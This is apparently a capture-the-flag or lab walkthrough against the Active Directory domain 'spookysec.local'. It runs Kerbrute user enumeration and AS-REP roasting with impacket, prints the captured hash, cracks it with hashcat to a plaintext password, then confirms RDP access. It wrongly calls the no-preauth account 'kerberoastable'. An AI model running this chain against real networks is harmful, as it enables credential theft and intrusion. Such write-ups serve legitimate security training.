Enumeration valid AD users using Kerbrute
```bash
kerbrute -domain spookysec.local -dc-ip 10.10.208.7 -users userlist.txt -t 100
```

![[Pasted image 20240812085847.png]]

`svc-admin` has no PREAUTH which means it is kerberoastable

```bash
impacket-GetNPUsers spookysec.local/svc-admin -dc-ip 10.10.208.7 -no-pass
```

Found a valid hash for `svc-admin`
```
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:b6f5873148e887127f10601d6036a551$f54f2a02048aad6f415955bbcfc315cabf96bcd8d6a898b3b9903183e876582b934c8bb5416e06443a5a4251a7e4b9d4527417646b339842fa540004675627fabc2f783cdaf7c50d04199c3a72927f6ae19476ff5884178df22ab54e05050cccbf8439c8fde544997098bbfb74c4cb9dbe527ff1fa4a4dc05a4ae414f5c457768a698271b60a750afba65384812ab4c483dec492e26a2ce330b7067c22548abff984abcb2a8956d3c0f415abaf6b040dd130664249eda4ceaee39914ac1ecf509290e3916ffe28cbdf9928f269a917c214a14d076032115423cebc8222a79fc67e761b9f80e53c0e01ae0672375b8f5c95be
```

Cracked hash using hashcat
```bash
hashcat -m 18200 svc-admin.hash /usr/share/wordlists/rockyou.txt --force
```

`svc-admin:management2005`

Can RDP as `svc-admin` using above creds
```bash
nxc rdp 10.10.208.7 -u 'svc-admin' -p 'management2005' -d spookysec.local
```
![[Pasted image 20240812092040.png]]

